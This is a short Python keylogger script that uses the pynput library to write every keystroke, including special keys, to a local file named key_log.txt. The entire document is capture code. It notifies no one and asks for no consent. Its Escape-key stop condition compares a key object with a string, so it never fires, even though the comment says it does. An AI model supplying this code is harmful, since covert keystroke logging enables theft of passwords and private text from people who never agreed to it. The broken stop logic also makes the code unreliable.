# Importing necessary libraries
from pynput.keyboard import Listener

# Setting up a log file to store keystrokes
log_file = "key_log.txt"

# This function will log each key pressed
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")  # Logs alphanumeric keys
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")  # Logs special keys (e.g., space, enter)

# This function stops the listener
def on_release(key):
    # Stops listening if the Escape key is pressed
    if key == 'Key.esc':
        return False

# Setting up the listener to record keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
